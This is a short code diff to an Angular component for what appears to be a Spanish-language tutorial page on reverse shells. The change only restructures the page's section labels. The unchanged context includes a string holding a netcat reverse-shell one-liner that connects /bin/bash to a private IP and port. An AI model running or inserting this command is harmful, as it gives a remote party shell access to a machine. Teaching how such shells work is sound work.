@@ -21,8 +21,8 @@ export class ReverShellComponent {
     });
   }
   sections: Section[] = [
-    { label: 'Que es una rever',
-    subSections: [
+    { label: 'Que es una rever'},
+
       { label: 'Como conseguir una rever',
       subSections: [
         { label: 'Rever basica con Netcat' },
@@ -45,8 +45,7 @@ export class ReverShellComponent {
         { label: 'Python' },
         { label: 'PHP' },
       ]}
-    ]
-     }
+ 
   ];
   pageTitle: string = '';
   nc:  string = `nc -e /bin/bash 192.168.1.134 4444`;
